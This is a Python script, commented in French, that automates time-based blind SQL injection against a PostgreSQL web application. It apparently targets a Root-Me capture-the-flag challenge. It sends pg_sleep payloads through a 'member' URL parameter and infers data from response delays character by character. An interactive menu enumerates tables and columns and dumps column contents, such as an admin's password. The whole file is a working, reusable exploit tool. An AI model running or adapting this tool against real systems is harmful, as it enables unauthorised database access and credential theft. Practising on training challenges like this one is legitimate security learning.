import requests
import time
import sys
from urllib.parse import quote

# --- CONFIGURATION ---
BASE_URL = "http://challenge01.root-me.org/web-serveur/ch40/"
SLEEP_TIME = 2.0  # Seuil de détection (en secondes)
SQL_SLEEP = 3     # Temps de pause demandé au serveur

# --- CŒUR DU REACTEUR ---

def make_request(payload):
    """
    Envoie le payload et retourne True si le serveur a dormi.
    Gère les erreurs réseaux silencieusement.
    """
    # Construction de l'URL finale avec encodage
    full_url = f"{BASE_URL}?action=member&member={quote(payload)}"
    try:
        start_time = time.time()
        requests.get(full_url)
        duration = time.time() - start_time
        return duration >= SLEEP_TIME
    except requests.exceptions.RequestException:
        return False

def check_injection():
    """Vérifie que l'injection fonctionne avant de commencer."""
    print("[*] Calibration de l'injection...")
    # Test basique : 1=1 doit dormir
    payload = f"1;select case when (1=1) then pg_sleep({SQL_SLEEP}) else pg_sleep(0) end-- -"
    
    if make_request(payload):
        print("[v] Serveur vulnérable et réactif (Time-Based).\n")
        return True
    else:
        print("[x] Erreur : Le serveur ne dort pas. Vérifie l'URL, ton VPN ou le payload.")
        sys.exit()

def blind_extraction(query_template, label_type):
    """
    Moteur générique d'extraction.
    query_template : La requête SQL contenant {offset}
    label_type : Description textuelle pour l'affichage
    """
    offset = 0
    
    # Boucle sur les lignes (ROW 1, ROW 2...)
    while True:
        extracted_value = ""
        position = 1
        
        # Si c'est la première ligne, on affiche ce qu'on cherche
        if offset == 0:
            print(f"[*] Recherche en cours...")

        found_something_at_this_offset = False

        # Boucle sur les caractères de la chaîne
        while True:
            char_found = False
            
            # Plage de caractères à tester (32=Espace à 126=~)
            for char_code in range(32, 127):
                current_char = chr(char_code)
                
                # Affichage temps réel (efface la ligne précédente)
                sys.stdout.write(f"\r    Ligne {offset+1} - En cours : {extracted_value}{current_char}")
                sys.stdout.flush()
                
                # Injection de l'offset dynamique
                target_query = query_template.format(offset=offset)
                
                # Construction du payload complet Time-Based
                payload = (
                    f"1;select case when "
                    f"(ascii(substring(({target_query}),{position},1))={char_code}) "
                    f"then pg_sleep({SQL_SLEEP}) else pg_sleep(0) end-- -"
                )
                
                if make_request(payload):
                    extracted_value += current_char
                    char_found = True
                    found_something_at_this_offset = True
                    break # On passe au caractère suivant
            
            if not char_found:
                # Fin de la chaîne trouvée pour cet offset
                break
            
            position += 1
            
        # Si on n'a rien trouvé du tout à la position 1 pour cet offset, c'est qu'il n'y a plus de lignes.
        if not found_something_at_this_offset and extracted_value == "":
            if offset == 0:
                print(f"\r    [!] Aucun résultat trouvé pour cette requête.          ")
            else:
                print(f"\r    [!] Fin des résultats.                                 ")
            break
            
        # Affichage propre du résultat trouvé
        sys.stdout.write(f"\r    [+] Résultat {offset+1} : {extracted_value}                    \n")
        offset += 1
        
        # Si on cherche une valeur précise (WHERE), souvent une seule ligne suffit, 
        # mais on laisse la boucle au cas où il y a des doublons.

# --- FONCTIONS DU MENU ---

def scan_tables():
    print("\n--- 1. SCAN DES TABLES (Schema public) ---")
    query = "select table_name::text from information_schema.tables where table_schema=$$public$$ limit 1 offset {offset}"
    blind_extraction(query, "Table")

def scan_columns():
    print("\n--- 2. SCAN DES COLONNES ---")
    table_name = input("Quelle table veux-tu scanner ? (ex: users) : ")
    if not table_name: return
    
    query = f"select column_name::text from information_schema.columns where table_name=$${table_name}$$ limit 1 offset {{offset}}"
    blind_extraction(query, "Colonne")

def dump_all_data():
    print("\n--- 3. DUMP DE TOUTE UNE COLONNE ---")
    table_name = input("Table cible : ")
    col_name = input("Colonne cible (ex: password) : ")
    if not table_name or not col_name: return

    query = f"select {col_name}::text from {table_name} limit 1 offset {{offset}}"
    blind_extraction(query, "Donnée")

def dump_targeted_data():
    print("\n--- 4. DUMP CIBLÉ (WHERE...) ---")
    print("Exemple : Je veux le 'password' de la table 'users' où le 'username' est 'admin'")
    
    table_name = input("Table cible (ex: users) : ")
    target_col = input("Colonne à extraire (ex: password) : ")
    where_col = input("Colonne condition (ex: username) : ")
    where_val = input(f"Valeur de la condition (ex: admin) : ")
    
    if not table_name or not target_col or not where_col: return

    # Utilisation des $$ pour entourer la valeur (évite les problèmes de guillemets simples)
    query = (
        f"select {target_col}::text from {table_name} "
        f"where {where_col}=$${where_val}$$ limit 1 offset {{offset}}"
    )
    
    print(f"\n[*] Exécution de : SELECT {target_col} FROM {table_name} WHERE {where_col} = '{where_val}'")
    blind_extraction(query, "Donnée Ciblée")

# --- MENU PRINCIPAL ---

def main():
    print("\n=== ROOT-ME BLIND SQLi TOOL (PostgreSQL) ===")
    check_injection()
    
    while True:
        print("\n--- MENU ---")
        print("1. Lister les TABLES")
        print("2. Lister les COLONNES d'une table")
        print("3. Dumper tout le contenu d'une colonne")
        print("4. Dumper une ligne précise (WHERE x = y)")
        print("5. Quitter")
        
        choice = input("\nTon choix [1-5] : ")
        
        if choice == '1':
            scan_tables()
        elif choice == '2':
            scan_columns()
        elif choice == '3':
            dump_all_data()
        elif choice == '4':
            dump_targeted_data()
        elif choice == '5':
            print("Bye bye hacker !")
            break
        else:
            print("Choix invalide.")

if __name__ == "__main__":
    main()